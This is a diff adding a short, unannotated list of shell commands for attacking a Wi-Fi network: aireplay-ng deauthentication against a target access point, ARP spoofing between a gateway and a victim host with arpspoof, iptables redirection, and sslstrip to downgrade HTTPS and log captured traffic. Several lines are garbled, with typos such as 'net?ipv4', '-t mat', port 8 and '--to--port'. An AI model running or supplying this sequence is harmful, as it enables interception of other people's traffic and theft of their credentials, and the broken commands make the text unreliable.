@@ -1,0 +1,19 @@
+airmon-ng check wlan0
+aireplay-ng -0 Count of Authentication_times 0 -a BSSID wlan0
+iwconfig wlan0 channel 6 
+aireplay-ng -0 0 -a BSSID wlan0
+
+yum search dsn
+sslstrip
+echo 1 > /proc/sys/net?ipv4/ip_forward
+echo 0 > /proc/sys/net?ipv4/ip_forward
+echo 1 > /proc/sys/net?ipv4/ip_forward
+iptables -t mat -A PREROUTING  -p tcp --destination-port 8 REDIRECT --to-port 8080
+iptables -t nat -L PREROUTING -p tcp --destination-port 8 REDIRECT --to--port 8080
+nmap iprange -0 -vv
+
+arpspoof -i wlan0 -t 192.168.0.1 -r 192.168.0.103
+iptables -I INPUT 1 -p tcp --dport 8080
+iptables -L INPUT
+sslstrip -l 8080
+tail -f sslstrip.log
